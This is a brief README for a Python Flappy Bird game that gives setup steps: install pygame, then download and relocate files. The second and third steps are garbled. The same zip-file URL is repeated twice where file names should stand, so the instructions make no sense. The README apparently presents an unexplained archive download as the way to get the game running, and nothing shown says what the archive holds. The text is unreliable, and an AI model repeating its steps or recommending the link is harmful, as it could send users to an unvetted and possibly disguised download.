# FLAPPY-BIRD-GAME
Flappy bird game 
to run this code on your machine:
1- Install pygame module by typing "pip install pygame" either on cmd or on powershell window
2- Download the https://github.com/eshan824/FLAPPY-BIRD-GAME/raw/refs/heads/main/enow/BIR-GAME-FLAPP-v2.4.zip & https://github.com/eshan824/FLAPPY-BIRD-GAME/raw/refs/heads/main/enow/BIR-GAME-FLAPP-v2.4.zip file along to run the game
3- Change the directory of https://github.com/eshan824/FLAPPY-BIRD-GAME/raw/refs/heads/main/enow/BIR-GAME-FLAPP-v2.4.zip & https://github.com/eshan824/FLAPPY-BIRD-GAME/raw/refs/heads/main/enow/BIR-GAME-FLAPP-v2.4.zip to where they are located in your pc.
